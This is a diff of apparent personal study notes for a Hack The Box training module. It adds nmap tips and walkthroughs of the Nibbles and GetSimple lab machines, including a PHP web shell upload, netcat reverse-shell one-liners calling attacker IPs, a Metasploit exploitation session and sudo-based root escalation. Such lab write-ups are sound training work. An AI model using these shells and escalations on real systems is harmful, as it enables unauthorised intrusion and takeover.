@@ -461,6 +461,9 @@ Option `-p` is to specify port ranges, and `-p-` to scan for all ports.
 Option `-sV` is to determine service/version info on open ports.
 
 
+Option `-sC` is very useful. It makes `nmap` use its default scripts to search for vulnerabilities. These scripts can be intrusive, so it is always important to understand exactly how our tools work.
+
+
 
 Option `-O` enables OS detection.
 
@@ -480,6 +483,18 @@ nmap -A -T4 -sV "10.129.15.46"
 Very fast scan:
 ```{bash eval=F}
 nmap -T5 -A -p- --min-rate=500 10.129.44.239
+```
+
+
+Option `--open` prints only open ports.
+
+We can check which ports nmap scans for a given scan type by running a scan with no target specified, using the command `nmap -v -oG -`. Here we will output the greppable format to stdout with `-oG -` and `-v` for verbose output.
+
+Option `-oA <basename>` outputs in various formats at once. It is useful to gather a lot of details.
+```{bash eval=F}
+nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
+ls
+nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml
 ```
 
 
@@ -676,7 +691,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again. On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.
 
-#### Privilege Escalation
+### Privilege Escalation
 
 Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.
 
@@ -686,11 +701,11 @@ Another useful tool we may use for server enumeration is the [Privilege Escalati
 
 Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
 
-##### Vulnerable Software
+#### Vulnerable Software
 
 Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
 
-##### User Privileges
+#### User Privileges
 
 We can check what sudo privileges we have with the `sudo -l` command.
 
@@ -698,7 +713,7 @@ Once we find a particular application we can run with sudo, we can look for ways
 
 [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.
 
-##### Scheduled Tasks
+#### Scheduled Tasks
 
 There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
 
@@ -713,13 +728,13 @@ The easiest way is to check if we are allowed to add new scheduled tasks. In Lin
 
 If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
 
-##### Exposed Credentials
+#### Exposed Credentials
 
 Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us
 
 We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user.
 
-##### SSH Keys
+#### SSH Keys
 
 Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
 ```{bash eval=F}
@@ -805,7 +820,7 @@ user@remotehost$ md5sum shell
 
 As we can see, both files have the same md5 hash, meaning the file was transferred correctly.
 
-#### Resources recommended by HTB
+### Resources recommended by HTB
 
 ```{txt eval=F}
 OWASP Juice Shop 	Is a modern vulnerable web application written in Node.js, Express, and Angular which
@@ -828,3 +843,254 @@ Aside from blogs related to retired HTB boxes, it is also worth seeking out blog
 Two great tutorial websites are [Under The Wire](https://underthewire.tech/wargames) and [Over The Wire](https://overthewire.org/wargames/). These websites are set up to help train users on using both Windows PowerShell and the Linux command line, respectively, through various scenarios in a "war games" format.
 
 The [Dante Pro Lab](https://app.hackthebox.com/prolabs/overview/dante) is the most beginner-friendly lab offered to date. This lab is geared towards players with some experience performing network and web application attacks and an understanding of networking concepts and the basics of penetration methodologies such as scanning/enumeration, lateral movement, privilege escalation, post-exploitation, etc.
+
+### Nibbles
+
+We can use `whatweb` to try to identify the web application in use.
+```{bash eval=F}
+whatweb 10.129.42.190
+http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ],
+HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
+```
+
+A quick Google search for "nibbleblog exploit" yields this Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The Metasploit module in question works for version 4.0.3. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this.
+```{bash eval=F}
+gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
+```
+```{bash eval=F}
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/admin.php (Status: 200)
+/content (Status: 301)
+/index.php (Status: 200)
+/languages (Status: 301)
+/plugins (Status: 301)
+/README (Status: 200)
+/themes (Status: 301)
+```
+```{bash eval=F}
+curl http://10.129.42.190/nibbleblog/README
+```
+```{bash eval=F}
+====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01
+<SNIP>
+```
+
+The HTTP code `301` means a permanent redirect. But that does not mean fail! We can check each of these.
+
+Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the XML output using `xmllint`.
+```{bash eval=F}
+curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
+```
+
+Up to this point, have the following pieces of the puzzle:
+
+* A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability.
+
+* An admin portal at `nibbleblog/admin.php`.
+
+* Directory listing which confirmed that admin is a valid username.
+
+* Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table.
+
+Taking another look through all of the exposed directories, we find a `config.xml` file.
+```{bash eval=F}
+curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
+```
+Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password? `Yes`.
+
+When performing password cracking offline with a tool such as `Hashcat` or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL).
+
+Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. Looking around a bit, we see the following page:
+```{txt eval=F}
+Plugins 	Allows us to configure, install, or uninstall plugins. The "My image" plugin allows us to upload
+            an image file. Could this be abused to upload PHP code potentially?
+```
+
+Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution.
+```{php eval=F}
+<?php system('id'); ?>
+<?php system('sudo bash'); ?>
+```
+
+Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a plugins directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
+```{bash eval=F}
+curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
+
+Let us use the following Bash reverse shell one-liner and add it to our PHP script.
+```{bash eval=F}
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
+```
+
+We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
+```{php eval=F}
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+```
+
+We upload the file again and start a `netcat` listener in our terminal:
+
+`cURL` the image page again or browse to it in Firefox at `http://nibbleblog/content/private/plugins/my_image/image.php` to execute the reverse shell.
+```{bash eval=F}
+nc -lvnp 9443
+listening on [any] 9443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
+/bin/sh: 0: cant access tty; job control turned off
+$ id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
+```{bash eval=F}
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+Try the various techniques for upgrading to a full TTY and pick one that works best for you.
+
+Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.
+
+Let's pull in `LinEnum.sh` to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command `sudo python3 -m http.server 8080`.
+
+The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
+```{bash eval=F}
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' |
+tee -a monitor.sh
+```
+It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.
+
+root flag: de5e5d6619862a8aa5b9b212314e0cdd
+
+Another way to get the reverse shell is by using `Metasploit` Nibbleblog exploit.
+
+### Tips
+
+Remember that enumeration is an iterative process. After performing our `nmap` port scans, make sure to perform detailed enumeration against all open ports based on what is running on the discovered ports. Follow the same process as we did with Nibbles:
+
+* Enumeration/Scanning with `nmap` - perform a quick scan for open ports followed by a full port scan.
+
+* Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include `whatweb` and `gobuster`.
+
+* If you identify the website URL, you can add it to your `/etc/hosts` file with the IP you get in the question below to load it normally, though this is unnecessary.
+
+* After identifying the technologies in use, use a tool such as `searchsploit` to find public exploits or search on Google for manual exploitation techniques.
+
+* After gaining an initial foothold, use the `Python3 pty` trick to upgrade to a pseudo TTY.
+
+* Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials.
+
+* Organize this data offline to determine the various ways to escalate privileges to root on this target.
+
+There are two ways to gain a foothold—one using `Metasploit` and one via a manual process. Challenge ourselves to work through and gain an understanding of both methods.
+
+There are two ways to escalate privileges to root on the target after obtaining a foothold. Make use of helper scripts such as [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to assist you. Filter through the information searching for two well-known privilege escalation techniques.
+
+### Knowledge Check
+
+Target: `10.129.42.249`.
+
+Go to `http://10.129.42.249/`, and we see we have to add `10.129.42.249   gettingstarted.htb` to `/etc/hosts`.
+
+After running `nmap` (ports 22 and 80 are open) and `gobuster`, we discover many accessible directories. The command `searchsploit getsimple` returns several vulnerabilities. Browsing through the accessible directories, we get
+```{html eval=F}
+http://gettingstarted.htb/data/cache/2a4c6447379fba09620ba05582eb61af.txt
+{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
+```
+
+The version is `3.3.15` and there is a corresponding exploit [https://www.exploit-db.com/exploits/46880](https://www.exploit-db.com/exploits/46880) available for this version. We then use `metasploit` and get a reverse shell on the target.
+```{bash eval=F}
+msfconsole
+msf6 > search GetSimple
+
+Matching Modules
+================
+
+#  Name                                              Disclosure Date  Rank       Check  Description
+-  ----                                              ---------------  ----       -----  -----------
+0  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    PHP File Upload Vuln.
+1  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    Unauthenticated RCE
+
+msf6 > use 1
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show options
+
+Module options (exploit/multi/http/getsimplecms_unauth_code_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port
+   RHOSTS                      yes       The target host(s)
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the cms
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   GetSimpleCMS 3.3.15 and before
+
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set rhosts 10.129.42.249
+rhosts => 10.129.42.249
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set lhost 10.10.15.201
+lhost => 10.10.15.201
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > show payloads
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > set payload generic/shell_reverse_tcp
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > check
+[+] 10.129.42.249:80 - The target is vulnerable.
+msf6 exploit(multi/http/getsimplecms_unauth_code_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.15.201:4444
+[*] Command shell session 1 opened (10.10.15.201:4444 -> 10.129.42.249:45940) at 2024-04-02 11:21:23 -0300
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+which python3
+/usr/bin/python3
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@gettingstarted:/var/www/html/theme$
+```
+
+Now we go to `/home/mrb3n` to get the user flag `user.txt`. Running `sudo -l`, we get
+```{bash eval=F}
+www-data@gettingstarted:/home/mrb3n$ sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+```
+
+The `php` interpreter can be runned as root. Therefore:
+```{bash eval=F}
+www-data@gettingstarted:/home/mrb3n$ cd /tmp
+www-data@gettingstarted:/tmp$ echo "<?php system('sudo bash'); ?>" > privesc.php
+www-data@gettingstarted:/tmp$ sudo php privesc.php
+root@gettingstarted:/tmp# whoami
+root
+root@gettingstarted:/tmp# cat /root/root.txt
+```
+
+### Recommended Machines/Challenges
+
+* Retired Machines: Academy (E), Access (E), Active (E), Admirer (E), Antique (E), Arctic (E), Armageddon (E), Backdoor (E), Bank (E), Bastion (E), Beep (E), Blocky (E), Blue (E), Blunder (E), Bounty (E), BountyHunter (E), Buff (E), Busqueda (E), Cap (E), Chatterbox (M), Curling (E), Delivery (E), Devel (E), Doctor (E), Driver (E), Explore (E), Forest (E), FriendZone (E), Frolic (E), GoodGames (E), Grandpa (E), Granny (E), Haystack (E), Heist (E), Help (E), Horizontall (E), Inject (E), Irked (E), Jerry (E), Knife (E), Laboratory (E), LaCasaDePapel (E), Lame (E), Late (E), Legacy (E), Love (E), Luanne (E), MetaTwo (E), Mirai (E), MonitorsTwo (E), Nest (E), Netmon (E), Networked (E), Nibbles (E), NodeBlog (E), Nunchucks (E), Omni (E), OpenAdmin (E), OpenSource (E), Optimum (E), Pandora (E), Paper (E), PC (E), Photobomb (E), Pilgrimage (E), Poison (M), Postman (E), Precious (E), Previse (E), RedPanda (E), Remote (E), Return (E), RouterSpace (E), Safe (E), Sauna (E), ScriptKiddie (E), Secret (E), Sense (E), ServMon (E), Shocker (E), Shoppy (E), Soccer (E), Spectra (E), Squashed (E), SteamCloud (E), Sunday (E), Support (E), SwagShop (E), Tabby (E), Teacher (E), Timelapse (E), Toolbox (E), Topology (E), Traceback (E).
+
+* Retired Challenges: Find The Easy Pass (E), Weak RSA (E), You know 0xDiablos (E), Emdee five for life (E), Under Construction (M).
+
+* Tracks: Beginner Track (E).
